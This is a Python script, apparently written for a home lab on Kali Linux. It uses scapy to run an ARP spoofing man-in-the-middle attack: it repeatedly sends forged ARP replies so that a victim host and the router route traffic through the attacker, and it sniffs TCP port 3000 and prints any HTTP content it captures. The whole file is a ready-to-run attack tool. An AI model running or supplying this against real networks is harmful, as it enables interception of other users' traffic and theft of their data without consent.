from scapy.all import *
import time
from threading import Thread

# ===== CONFIGURATION ===== (UPDATE THESE VALUES!)
TARGET_IP = "192.168.0.171"    # Windows host IP (victim server)
GATEWAY_IP = "192.168.0.1"      # Router IP
INTERFACE = "eth0"              # Kali's network interface (check with 'ip a')
# =========================

def get_mac(ip):
    """Get MAC address of a device on the network"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    return ans[0][1].hwsrc if ans else None

def spoof():
    """Send fake ARP replies to trick devices"""
    target_mac = get_mac(TARGET_IP)
    gateway_mac = get_mac(GATEWAY_IP)
    
    # Tell victim: "I'm the router!"
    sendp(
        Ether(dst=target_mac)/ARP(op=2, psrc=GATEWAY_IP, pdst=TARGET_IP, hwdst=target_mac),
        iface=INTERFACE, verbose=False
    )
    # Tell router: "I'm the victim!"
    sendp(
        Ether(dst=gateway_mac)/ARP(op=2, psrc=TARGET_IP, pdst=GATEWAY_IP, hwdst=gateway_mac),
        iface=INTERFACE, verbose=False
    )

def process_packet(packet):
    """Check captured packets for HTTP data"""
    if packet.haslayer(TCP):
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport
        print(f"\n[TCP] {packet[IP].src}:{src_port} -> {packet[IP].dst}:{dst_port}")
        
        if packet.haslayer(Raw):
            try:
                payload = packet[Raw].load.decode('utf-8', errors='replace')
                if "HTTP" in payload:  # Filter HTTP traffic
                    print("[+] HTTP Content (first 200 chars):")
                    print("-"*50)
                    print(payload[:200])  # Short sample to avoid clutter
                    print("-"*50)
            except:
                pass  # Skip unreadable packets

def arp_spoof_loop():
    """Keep sending fake ARP replies every 2 seconds"""
    while True:
        spoof()
        time.sleep(2)

def start_sniffer():
    """Start listening for HTTP traffic"""
    print(f"[*] Sniffing HTTP traffic on port 3000...")
    print(f"[*] Press Ctrl+C to stop\n")
    sniff(
        iface=INTERFACE,
        filter="tcp port 3000",  # Only watch port 3000
        prn=process_packet,
        store=False
    )

if __name__ == "__main__":
    try:
        print("[*] Starting ARP spoofing attack...")
        print(f"[*] Redirecting: {TARGET_IP} <--> {GATEWAY_IP}")
        
        # Start ARP spoofing in background
        spoof_thread = Thread(target=arp_spoof_loop)
        spoof_thread.daemon = True
        spoof_thread.start()
        
        # Start packet sniffer
        start_sniffer()
        
    except KeyboardInterrupt:
        print("\n[!] Stopping attack...")
        print("[*] ARP tables should restore automatically")